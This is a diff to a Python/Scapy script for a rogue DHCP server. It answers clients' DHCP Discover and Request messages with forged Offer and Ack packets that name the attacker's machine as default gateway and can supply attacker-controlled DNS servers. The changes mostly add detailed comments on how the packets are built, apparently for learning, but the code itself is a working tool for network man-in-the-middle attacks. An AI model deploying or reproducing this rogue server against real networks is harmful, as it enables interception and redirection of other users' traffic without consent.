@@ -17,18 +17,18 @@ logger = logging.getLogger(__name__)
 
 class RogueDHCPServer:
     def __init__(self, interface, ip_pool, subnet_mask, gateway, dns_servers, lease_time=300):
-        self.interface = interface
-        self.ip_pool = ip_pool
-        self.subnet_mask = subnet_mask
-        self.gateway = gateway
-        self.dns_servers = dns_servers
-        self.lease_time = lease_time
+        self.interface = interface # Network interface to listen on
+        self.ip_pool = ip_pool 
+        self.subnet_mask = subnet_mask 
+        self.gateway = gateway # Attacker's own machine IP, used as gateway
+        self.dns_servers = dns_servers # List of DNS servers to provide
+        self.lease_time = lease_time # Duration for which the IP is booked
         self.allocated_ips = {}
         self.server_ip = gateway  # Using gateway IP as server IP
         
         # Convert IP pool string to list of available IPs
-        network = ipaddress.ip_network(ip_pool, strict=False)
-        self.available_ips = [str(ip) for ip in network.hosts()]
+        network = ipaddress.ip_network(ip_pool, strict=False) # ip_netwrok parses ip into a subnet object
+        self.available_ips = [str(ip) for ip in network.hosts()] # Skips broadcast and network addresses
         
     def handle_dhcp_discover(self, packet):
         if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
@@ -43,8 +43,42 @@ class RogueDHCPServer:
                 self.allocated_ips[client_mac] = offered_ip
                 
                 logger.info(f"Offering IP {offered_ip} to {client_mac}")
+
+
+                # This finalizes the IP assignment to the client.
+                #
+                # Packet Structure (Layer by Layer):
+                #
+                # 1. Ethernet Layer: (Broadcast instead of unicast because Client doesn't have an IP yet.
+                #    Also, the client may not have a Full ARP Table Yet)
+                #    - src: Attacker's MAC address (retrieved from interface)
+                #    - dst: Broadcast address (ff:ff:ff:ff:ff:ff) to reach the client
+                #
+                # 2. IP Layer:
+                #    - src: Rogue server's IP (usually same as the fake gateway)
+                #    - dst: Broadcast (255.255.255.255)
+                #
+                # 3. UDP Layer:
+                #    - sport: 67 (server port)
+                #    - dport: 68 (client port)
+                #
+                # 4. BOOTP Layer:
+                #    - op=2: Indicates this is a reply (vs request)
+                #    - xid: Transaction ID of what the client sent
+                #    - yiaddr: The IP we're assigning to the client
+                #    - siaddr: Server IP (our rogue DHCP server IP)
+                #    - chaddr: Client MAC address (converted to bytes)
+                #
+                # 5. DHCP Options:
+                #    - message-type: "offer", offers an IP to the client
+                #    - server_id: DHCP server IP (same as gateway)
+                #    - subnet_mask: Subnet for client's IP
+                #    - router: Default gateway to use (attacker's IP)
+                #    - name_server: DNS servers (can include attacker-controlled DNS)
+                #    - lease_time: How long the client can keep the IP
+                #    - end: Marks end of DHCP options list
                 
-                # Craft DHCP Offer
+
                 dhcp_offer = Ether(src=get_if_hwaddr(self.interface), dst="ff:ff:ff:ff:ff:ff") / \
                             IP(src=self.server_ip, dst="255.255.255.255") / \
                             UDP(sport=67, dport=68) / \
@@ -68,8 +102,7 @@ class RogueDHCPServer:
             if client_mac in self.allocated_ips:
                 assigned_ip = self.allocated_ips[client_mac]
                 logger.info(f"Received DHCP Request from {client_mac} for IP {assigned_ip}")
-                
-                # Craft DHCP Ack
+
                 dhcp_ack = Ether(src=get_if_hwaddr(self.interface), dst="ff:ff:ff:ff:ff:ff") / \
                           IP(src=self.server_ip, dst="255.255.255.255") / \
                           UDP(sport=67, dport=68) / \
@@ -95,8 +128,11 @@ class RogueDHCPServer:
         logger.info(f"Lease Time: {self.lease_time} seconds")
         
         # Start sniffing for DHCP packets
-        sniff_filter = "udp and (port 67 or port 68)"
-        sniff(iface=self.interface, filter=sniff_filter, prn=self.process_packet, store=0)
+        sniff_filter = "udp and (port 67 or port 68)" #  Capture filter for DHCP packets
+        # prn -> For every packet, call process_packet.
+        #Store = 0 -> Don't save packets in memory
+        sniff(iface=self.interface, filter=sniff_filter, prn=self.process_packet, store=0) 
+
     
     def process_packet(self, packet):
         if DHCP in packet:
@@ -104,9 +140,12 @@ class RogueDHCPServer:
             if message_type == 1:  # DHCP Discover
                 self.handle_dhcp_discover(packet)
             elif message_type == 3:  # DHCP Request
-                self.handle_dhcp_request(packet)
+                self.handle_dhcp_request(packet) 
 
-def load_config(config_file):
+            # message_type == 2: DHCPOFFER 
+            # message_type == 5: DHCPACK
+
+def load_config(config_file="config.ini"):
     config = configparser.ConfigParser()
     config.read(config_file)
     
